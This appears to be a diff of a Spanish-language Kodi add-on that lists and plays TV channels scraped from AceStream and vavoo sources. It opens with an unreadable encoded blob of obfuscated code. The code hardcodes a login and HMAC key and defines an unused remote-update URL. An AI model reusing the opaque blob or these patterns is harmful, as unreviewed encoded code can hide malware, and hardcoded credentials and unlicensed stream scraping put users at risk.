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'))
+# -*- coding: utf-8 -*-
+import sys
+import urllib.parse
+import re
+import xbmcplugin
+import xbmcgui
+import xbmc
+import requests
+import xbmcvfs
+import os
+import json
+import base64
+import hashlib
+import hmac
+
+addon_handle = int(sys.argv[1])
+base_url = sys.argv[0]
+
+ICON_PATH = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/icono.png')
+FANART_PATH = xbmcvfs.translatePath('special://home/addons/plugin.video.tronosstv/resources/fanart.jpg')
+CREDENTIALS_FILE = xbmcvfs.translatePath('special://profile/addon_data/plugin.video.tronosstv/credentials.json')
+SECRET_KEY = "c0mpl3xS3cur3K3y"
+REMOTE_STATUS_URL = "https://raw.githubusercontent.com/tronoss99/repo/main/status.json"
+UPDATE_URL = "https://raw.githubusercontent.com/tronoss99/repo/main/main.py"
+ACESTREAM_URL = "https://ipfs.io/ipns/elcano.top"
+
+def to_utf8(text):
+    if isinstance(text, str):
+        return text.encode('utf-8', 'ignore').decode('utf-8')
+    return text
+
+def check_remote_status():
+    try:
+        response = requests.get(REMOTE_STATUS_URL)
+        if response.status_code == 200:
+            status_data = response.json()
+            if status_data.get("status") == "mantenimiento":
+                xbmcgui.Dialog().ok(
+                    to_utf8("Mantenimiento"),
+                    to_utf8(status_data.get("message", "El addon esta en mantenimiento."))
+                )
+                return False  
+        return True
+    except Exception as e:
+        xbmcgui.Dialog().notification(
+            to_utf8("Error"),
+            to_utf8(f"No se pudo verificar el estado remoto: {e}"),
+            xbmcgui.NOTIFICATION_ERROR
+        )
+        return True
+
+def obfuscate_credentials(username, password):
+    combined = f"{username}:{password}".encode('utf-8')
+    hmac_digest = hmac.new(SECRET_KEY.encode('utf-8'), combined, hashlib.sha256).digest()
+    return base64.urlsafe_b64encode(hmac_digest).decode('utf-8')
+
+def save_credentials(username, password):
+    os.makedirs(os.path.dirname(CREDENTIALS_FILE), exist_ok=True)
+    obfuscated = obfuscate_credentials(username, password)
+    with open(CREDENTIALS_FILE, 'w') as f:
+        json.dump({"auth": obfuscated}, f)
+
+def load_credentials():
+    if os.path.exists(CREDENTIALS_FILE):
+        with open(CREDENTIALS_FILE, 'r') as f:
+            data = json.load(f)
+            return data.get("auth")
+    return None
+
+def prompt_for_credentials():
+    keyboard = xbmcgui.Dialog()
+    username = to_utf8(keyboard.input(to_utf8("Introduce el usuario"), type=xbmcgui.INPUT_ALPHANUM))
+    if not username:
+        return None, None
+    password = to_utf8(keyboard.input(to_utf8("Introduce la contrasena"), type=xbmcgui.INPUT_ALPHANUM, option=xbmcgui.PASSWORD_VERIFY))
+    if not password:
+        return None, None
+    return username, password
+
+def check_credentials():
+    stored_auth = load_credentials()
+    correct_auth = obfuscate_credentials("tronoss", "tronoss1234")
+    if stored_auth == correct_auth:
+        return True
+
+    xbmcgui.Dialog().notification(to_utf8("Inicio de sesion"), to_utf8("Por favor, inicia sesion"), xbmcgui.NOTIFICATION_INFO)
+    while True:
+        username, password = prompt_for_credentials()
+        if obfuscate_credentials(username, password) == correct_auth:
+            save_credentials(username, password)
+            xbmcgui.Dialog().notification(to_utf8("Exito"), to_utf8("Inicio de sesion correcto"), xbmcgui.NOTIFICATION_INFO)
+            return True
+        else:
+            xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8("Usuario o contrasena incorrectos"), xbmcgui.NOTIFICATION_ERROR)
+
+def get_page_content(url):
+    try:
+        response = requests.get(url)
+        response.encoding = 'utf-8'
+        if response.status_code == 200:
+            return response.text
+        else:
+            xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8(f"HTTP {response.status_code}"), xbmcgui.NOTIFICATION_ERROR)
+            return ""
+    except Exception as e:
+        xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8(str(e)), xbmcgui.NOTIFICATION_ERROR)
+        return ""
+
+def extract_acestream_links(content):
+    channels = []
+    pattern_full = r'"name":\s*"([^"]+)".*?"url":\s*"acestream://([a-fA-F0-9]+)"'
+    matches_full = re.findall(pattern_full, content)
+    for name, channel_id in matches_full:
+        if '{' not in name and '}' not in name:  
+            channels.append((name.strip(), channel_id.strip()))
+    pattern_no_link = r'"name":\s*"([^"]+)"'
+    matches_no_link = re.findall(pattern_no_link, content)
+    for name in matches_no_link:
+        if '{' not in name and '}' not in name:  
+            if name not in [c[0] for c in channels]:
+                channels.append((name.strip(), ""))
+    lines = content.splitlines()
+    for line in lines:
+        line = line.strip()
+        if "acestream://" in line and not re.search(r'acestream://[a-fA-F0-9]+', line):
+            name_match = re.match(r'(.*?)\s*acestream://', line)
+            if name_match:
+                name = name_match.group(1).strip()
+                if '{' not in name and '}' not in name: 
+                    if name not in [c[0] for c in channels]:
+                        channels.append((name, ""))
+    return sorted(channels, key=lambda x: x[0].lower())
+
+def build_url(query):
+    return f"{base_url}?{urllib.parse.urlencode(query)}"
+
+def list_channels():
+    content = get_page_content(ACESTREAM_URL)
+    if not content:
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    channels = extract_acestream_links(content)
+    if not channels:
+        xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8("No se encontraron canales"), xbmcgui.NOTIFICATION_WARNING)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    for name, channel_id in channels:
+        url = build_url({"action": "play", "id": channel_id}) if channel_id else ""
+        list_item = xbmcgui.ListItem(to_utf8(name))
+        list_item.setInfo("video", {"title": to_utf8(name)})
+        list_item.setProperty("IsPlayable", "true")
+        list_item.setArt({
+            'icon': ICON_PATH,
+            'thumb': ICON_PATH,
+            'fanart': FANART_PATH
+        })
+        xbmcplugin.addDirectoryItem(handle=addon_handle, url=url, listitem=list_item, isFolder=False)
+
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def play_channel(channel_id):
+    if not channel_id:
+        xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8("Canal sin ID disponible"), xbmcgui.NOTIFICATION_ERROR)
+        return
+
+    horus_command = f'RunPlugin("plugin://script.module.horus/?action=play&id={channel_id}")'
+    try:
+        xbmc.executebuiltin(horus_command)
+        xbmcgui.Dialog().notification(to_utf8("Horus"), to_utf8("Reproduciendo en AceStream Engine..."), xbmcgui.NOTIFICATION_INFO)
+    except Exception as e:
+        xbmcgui.Dialog().notification(to_utf8("Error"), to_utf8(f"No se pudo ejecutar Horus: {e}"), xbmcgui.NOTIFICATION_ERROR)
+
+def build_main_menu():
+    xbmc.executebuiltin('Container.SetViewMode(55)')
+
+    url_tronosstv = build_url({"action": "tronosstv"})
+    list_item_tronosstv = xbmcgui.ListItem(label="TronossTV")
+    list_item_tronosstv.setProperty("IsPlayable", "false")
+    list_item_tronosstv.setArt({'icon': '', 'thumb': ICON_PATH, 'fanart': FANART_PATH})
+    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url_tronosstv, listitem=list_item_tronosstv, isFolder=True)
+
+    url_tronossiptv = build_url({"action": "tronossiptv"})
+    list_item_tronossiptv = xbmcgui.ListItem(label="TronossIPTV")
+    list_item_tronossiptv.setProperty("IsPlayable", "false")
+    list_item_tronossiptv.setArt({'icon': '', 'thumb': ICON_PATH, 'fanart': FANART_PATH})
+    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url_tronossiptv, listitem=list_item_tronossiptv, isFolder=True)
+
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def get_channels_from_vavoo():
+    url = "https://www2.vavoo.to/live2/index"
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.text
+            pattern = r'#EXTINF:-1.*group-title="Spain".*tvg-logo="([^"]+)".*?,(.+)\n(.+)'
+            channels = re.findall(pattern, data)
+            return [
+                {"name": name.strip(), "logo": logo.strip(), "url": url.strip()}
+                for logo, name, url in channels
+            ]
+        else:
+            xbmcgui.Dialog().notification("Error", f"HTTP {response.status_code}", xbmcgui.NOTIFICATION_ERROR)
+            return []
+    except Exception as e:
+        xbmcgui.Dialog().notification("Error", str(e), xbmcgui.NOTIFICATION_ERROR)
+        return []
+
+def list_tronoss_iptv():
+    channels = get_channels_from_vavoo()
+    if not channels:
+        xbmcgui.Dialog().notification("Error", "No se encontraron canales en el grupo Spain.", xbmcgui.NOTIFICATION_WARNING)
+        xbmcplugin.endOfDirectory(addon_handle)
+        return
+
+    for channel in channels:
+        name = channel["name"]
+        logo = channel["logo"]
+        url = channel["url"]
+        
+        list_item = xbmcgui.ListItem(to_utf8(name))
+        list_item.setInfo("video", {"title": to_utf8(name)})
+        list_item.setProperty("IsPlayable", "true")
+        list_item.setArt({
+            'icon': logo,
+            'thumb': logo,
+            'fanart': FANART_PATH
+        })
+        xbmcplugin.addDirectoryItem(handle=addon_handle, url=url, listitem=list_item, isFolder=False)
+
+    xbmcplugin.endOfDirectory(addon_handle)
+
+def play_channel_normal(url):
+    if not url:
+        xbmcgui.Dialog().notification("Error", "No hay URL disponible para este canal.", xbmcgui.NOTIFICATION_ERROR)
+        return
+
+    try:
+        xbmc.Player().play(url)
+        xbmcgui.Dialog().notification("Reproduccion", "Canal en reproducción.", xbmcgui.NOTIFICATION_INFO)
+    except Exception as e:
+        xbmcgui.Dialog().notification("Error", str(e), xbmcgui.NOTIFICATION_ERROR)
+
+def router(args):
+    action = args.get("action", [None])[0]
+    channel_url = args.get("url", [None])[0]
+
+    if action == "play" and channel_url:
+        play_channel_normal(channel_url)
+    elif action == "tronosstv":
+        list_channels()
+    elif action == "tronossiptv":
+        list_tronoss_iptv()
+    else:
+        build_main_menu()
+
+
+if __name__ == "__main__":
+    if not check_remote_status():
+        xbmcplugin.endOfDirectory(addon_handle)
+    elif check_credentials():
+        args = urllib.parse.parse_qs(sys.argv[2][1:])
+        router(args)
+    else:
+        xbmcplugin.endOfDirectory(addon_handle)
